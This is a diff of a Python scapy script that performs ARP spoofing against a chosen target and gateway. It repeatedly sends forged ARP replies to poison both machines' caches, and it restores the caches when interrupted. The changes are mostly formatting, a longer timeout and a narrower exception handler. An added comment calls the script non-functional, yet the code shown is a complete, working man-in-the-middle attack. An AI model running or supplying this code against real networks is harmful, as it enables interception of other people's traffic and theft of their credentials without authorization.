@@ -3,16 +3,20 @@ import time
 import scapy.all as scapy
 from optparse import OptionParser
 
-def get_mac(ip, timeout = 1):
+# This script just for abstract the idea not to make the real arp spoof
+
+def get_mac(ip, timeout=10):
     arp = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request = broadcast/arp
+    arp_request = broadcast / arp
     answers = scapy.srp(arp_request, timeout=int(timeout), verbose=False)[0]
     return answers[0][1].hwsrc
+
 
 def arp_spoofing(victim, spoofing_ip):
     packet = scapy.ARP(op=2, psrc=spoofing_ip, pdst=victim, hwdst=get_mac(victim))
     scapy.send(packet, verbose=False)
+
 
 def restore(dest_ip, src_ip):
     dest_hw = get_mac(dest_ip)
@@ -34,15 +38,14 @@ gateway_ip = args.gateway
 
 pkt_cnt = 2
 print("[+] Spoofing Started [+]")
-try: 
+try:
     while True:
         arp_spoofing(target_ip, gateway_ip)
         arp_spoofing(gateway_ip, target_ip)
         print(f"\r[+] Sent {pkt_cnt} packet", end="")
         pkt_cnt += 2
         time.sleep(2)
-except:
+except KeyboardInterrupt:
     print("\n>> Restoring Old Sate")
-    
     restore(target_ip, gateway_ip)
     print("[>] Detected CTRL + C .... Quitting. [<]")
